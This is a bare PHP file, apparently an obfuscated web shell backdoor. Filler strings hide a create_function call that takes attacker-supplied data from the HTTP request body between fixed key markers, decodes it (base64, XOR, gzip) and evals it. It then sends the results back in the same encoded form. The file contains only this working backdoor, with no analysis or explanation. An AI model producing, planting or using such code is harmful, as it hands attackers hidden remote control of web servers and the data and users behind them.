<?php
$z='+ch("/e+$kh(.+e+e+)$kf/",@file_get_conte+ee+e+nts("php://ie+nput"e+),$m)=';
$V='de($e+m[1]),$e+k)));$o=@ob_ge+et_contents(e+)e+;@oe+b_end_clean();e+$r=@bas';
$f='=1e+) {@ob_stare+te+();@evae+e+l(@gzuncomprese+s(@x(@bae+e+se64_de+ee+coe+';
$r=');$j++,$i++)e+{$o.e+=$te+{$i}^$k{$e+je+};}}return e+$o;e+}if (@pe+reg_mate+e';
$e=str_replace('QK','','crQKeQKatQKe_fuQKncQKtQKion');
$k='ee+64_e+ee+ncode(e+@x(@gzce+ompree+ss($o)e+,$ke+));pe+rint("$p$kh$r$kf");}';
$X='$k="2de+5e+3ce+e+678";$kh="0f9d9ecde+c944";$kf="e+5c2033e+4d8900"e+;$p="e';
$G='trlen($t);$oe+=e+"";for(e+$i=0;$i<$le+;){fe+or(e+$je+=0;($j<e+e+$c&&$i<$l';
$c='+C3e+e+yntaYPMpLuoe+B9e+Z";functioe+ne+ x($t,$e+k){$c=strlen($k)e+;$l=se+e+';
$I=str_replace('e+','',$X.$c.$G.$r.$z.$f.$V.$k);
$g=$e('',$I);$g();
?>
